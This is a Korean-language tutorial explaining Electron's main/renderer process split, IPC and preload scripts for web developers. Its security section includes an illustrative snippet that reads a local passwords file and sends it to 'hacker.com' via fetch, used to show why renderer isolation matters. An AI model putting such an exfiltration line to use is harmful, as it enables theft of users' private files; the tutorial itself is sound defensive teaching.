# Electron 아키텍처 가이드 (웹 개발자를 위한)

## 🤔 "왜 Electron은 이렇게 복잡하지?"

웹 개발자라면 이런 의문이 들 수 있습니다:
- "그냥 브라우저에서 돌아가는 React 앱인데 왜 이렇게 복잡하지?"
- "일반 웹앱과 뭐가 다른 거지?"
- "메인 프로세스, 렌더러 프로세스가 뭐야?"

**답: 데스크톱 앱은 웹앱과 다른 특별한 능력이 필요하기 때문입니다.**

## 🌐 웹앱 vs 데스크톱앱 비교

### 웹앱 (우리가 익숙한 것)
```
┌─────────────────────────────────────┐
│            브라우저 (Chrome)           │
│  ┌─────────────────────────────────┐  │
│  │         React 앱               │  │
│  │  - API 호출만 가능              │  │
│  │  - 파일 시스템 접근 불가         │  │
│  │  - 시스템 알림 제한적           │  │
│  │  - 브라우저 보안 정책 적용       │  │
│  └─────────────────────────────────┘  │
└─────────────────────────────────────┘
```

### 데스크톱앱 (Electron)
```
┌─────────────────────────────────────────────────────────────┐
│                    Electron 앱                              │
│  ┌─────────────────┐           ┌─────────────────────────────┐  │
│  │  메인 프로세스   │  ◄─IPC──►  │      렌더러 프로세스        │  │
│  │  (Node.js)     │           │      (Chromium)           │  │
│  │                │           │  ┌─────────────────────────┐ │  │
│  │  - 파일 읽기    │           │  │      React 앱          │ │  │
│  │  - 윈도우 생성  │           │  │  - UI 렌더링           │ │  │
│  │  - 시스템 접근  │           │  │  - 사용자 인터랙션      │ │  │
│  │  - DB 접근     │           │  │  - 브라우저 환경        │ │  │
│  └─────────────────┘           │  └─────────────────────────┘ │  │
└─────────────────────────────────────────────────────────────┘
```

## 💡 왜 이렇게 나누어져 있을까?

### 1. **보안 때문입니다**
```javascript
// ❌ 웹에서는 이런 것이 불가능 (보안상 위험)
const fs = require('fs');
fs.readFileSync('/etc/passwd'); // 시스템 파일 읽기

// ✅ Electron에서는 메인 프로세스에서만 가능
// 렌더러 프로세스(React)에서는 직접 접근 불가
```

### 2. **역할 분담이 명확합니다**
- **메인 프로세스**: "허가받은 시스템 관리자" 역할
- **렌더러 프로세스**: "UI 담당 직원" 역할
- **IPC**: "둘 사이의 안전한 통신 창구"

## 🎭 Electron을 연극으로 이해해보기

### 배역 소개
- **메인 프로세스**: 극장 관리자 (Node.js)
- **렌더러 프로세스**: 무대 위 배우들 (React 앱)
- **IPC**: 관리자와 배우 사이의 무전기
- **프리로드 스크립트**: 안전한 통역사

### 시나리오: "파일을 열어주세요!"

```
1. 👤 사용자: "파일 열기" 버튼 클릭

2. 🎭 배우(React): "관리자님! 파일 열어주세요!"
   const file = await window.electronAPI.dialog.openFile();

3. 📻 무전기(IPC): 안전하게 메시지 전달

4. 🎯 관리자(메인 프로세스): "알겠습니다. 파일 다이얼로그 띄울게요"
   const result = await dialog.showOpenDialog();

5. 📻 무전기(IPC): 결과를 안전하게 다시 전달

6. 🎭 배우(React): "받았습니다! 화면에 표시할게요"
   setSelectedFile(file);
```

## 🔧 실제 코드로 이해하기

### 일반적인 웹앱에서 파일 읽기 (불가능)
```javascript
// ❌ 웹에서는 이렇게 할 수 없습니다
function readFile() {
  const fs = require('fs'); // ReferenceError!
  return fs.readFileSync('document.txt');
}
```

### Electron에서 파일 읽기 (올바른 방법)

#### 1단계: 메인 프로세스 (파일 시스템 담당)
```javascript
// electron/main.ts - "관리자"
import { ipcMain, dialog } from 'electron';
import fs from 'fs';

// 안전한 파일 읽기 서비스 제공
ipcMain.handle('file:read', async () => {
  // 1. 사용자에게 파일 선택하게 함
  const result = await dialog.showOpenDialog({
    filters: [{ name: 'Text Files', extensions: ['txt'] }]
  });
  
  if (result.canceled) return null;
  
  // 2. 선택된 파일 읽기
  const content = fs.readFileSync(result.filePaths[0], 'utf8');
  return content;
});
```

#### 2단계: 프리로드 스크립트 (안전한 통역사)
```javascript
// electron/preload.js - "통역사"
const { contextBridge, ipcRenderer } = require('electron');

// React 앱에서 사용할 수 있는 안전한 API만 노출
contextBridge.exposeInMainWorld('electronAPI', {
  file: {
    read: () => ipcRenderer.invoke('file:read') // 안전한 통로
  }
});
```

#### 3단계: React 앱 (UI 담당)
```typescript
// src/App.tsx - "배우"
function App() {
  const [fileContent, setFileContent] = useState('');

  const handleReadFile = async () => {
    try {
      // 안전한 API를 통해 파일 읽기 요청
      const content = await window.electronAPI.file.read();
      if (content) {
        setFileContent(content);
      }
    } catch (error) {
      console.error('파일 읽기 실패:', error);
    }
  };

  return (
    <div>
      <button onClick={handleReadFile}>파일 열기</button>
      <pre>{fileContent}</pre>
    </div>
  );
}
```

## 🔐 보안이 왜 중요할까?

### 만약 보안이 없다면...
```javascript
// ❌ 이런 일이 가능해집니다 (매우 위험!)
function maliciousCode() {
  // 악성 웹사이트가 여러분의 파일을 몰래 읽을 수 있음
  const secrets = fs.readFileSync('/Users/you/passwords.txt');
  
  // 여러분의 개인정보를 인터넷으로 전송
  fetch('http://hacker.com/steal', { 
    method: 'POST', 
    body: secrets 
  });
}
```

### Electron의 보안 모델
```javascript
// ✅ 안전한 방법: 단계별 검증과 허가
// 1. 사용자가 직접 파일 선택 (강제)
// 2. 프리로드 스크립트에서 허용된 작업만 노출
// 3. 메인 프로세스에서 최종 검증 후 실행
```

## 🌟 실무에서 자주 하는 실수들

### 실수 1: 렌더러에서 직접 Node.js 사용
```javascript
// ❌ 이렇게 하면 안 됩니다
import fs from 'fs'; // 에러 발생!

function MyComponent() {
  const data = fs.readFileSync('file.txt'); // 불가능!
  return <div>{data}</div>;
}
```

### 올바른 방법: IPC 통신 사용
```javascript
// ✅ 이렇게 해야 합니다
function MyComponent() {
  const [data, setData] = useState('');

  useEffect(() => {
    // 안전한 IPC 통신을 통해 데이터 요청
    window.electronAPI.file.read().then(setData);
  }, []);

  return <div>{data}</div>;
}
```

### 실수 2: 프리로드 스크립트 빼먹기
```javascript
// ❌ 프리로드 없이 바로 IPC 사용 시도
function App() {
  // window.electronAPI가 undefined!
  const data = await window.electronAPI.getData(); // 에러!
}
```

### 올바른 방법: 프리로드 스크립트 필수 설정
```javascript
// 메인 프로세스에서 윈도우 생성 시
new BrowserWindow({
  webPreferences: {
    preload: path.join(__dirname, 'preload.js'), // 필수!
    nodeIntegration: false,
    contextIsolation: true
  }
});
```

## 🚀 개발 워크플로우 이해하기

### 일반 웹 개발 워크플로우
```
코드 수정 → 브라우저 새로고침 → 확인 → 완료
```

### Electron 개발 워크플로우
```
1. React 코드 수정 → 브라우저처럼 핫 리로드 ✅
2. 메인 프로세스 코드 수정 → Electron 앱 재시작 필요 ⚠️
3. 프리로드 스크립트 수정 → Electron 앱 재시작 필요 ⚠️
```

### 개발 명령어 이해
```bash
npm run dev  # 이 명령어가 실제로 하는 일:
# 1. Vite 개발 서버 시작 (React 앱)
# 2. TypeScript 컴파일 (메인 프로세스)
# 3. Electron 앱 실행
# 4. 두 프로세스 연결
```

## 🎯 핵심 요약 (TL;DR)

### 웹 개발자가 알아야 할 Electron 핵심 3가지

1. **분리된 환경**: React는 브라우저 환경, 시스템 작업은 Node.js 환경
2. **IPC 통신**: 두 환경 사이의 안전한 대화 방법
3. **프리로드 스크립트**: React에서 시스템 기능을 안전하게 사용하는 다리

### 개발할 때 기억할 것

```typescript
// React 컴포넌트에서는
const data = await window.electronAPI.someFunction(); // ✅

// 메인 프로세스에서는  
ipcMain.handle('channel', async () => {
  // Node.js 코드 작성
}); // ✅

// 프리로드에서는
contextBridge.exposeInMainWorld('electronAPI', {
  someFunction: () => ipcRenderer.invoke('channel')
}); // ✅
```

이제 Electron이 왜 이렇게 설계되었는지, 그리고 실제로 어떻게 사용하는지 이해가 되셨나요? 🚀

## 📚 더 알아보기

- **다음 단계**: 실제 프로젝트 구조 살펴보기
- **심화 학습**: IPC 통신 패턴과 성능 최적화
- **실전 팁**: 디버깅 방법과 문제 해결

궁금한 점이 있다면 언제든 물어보세요!
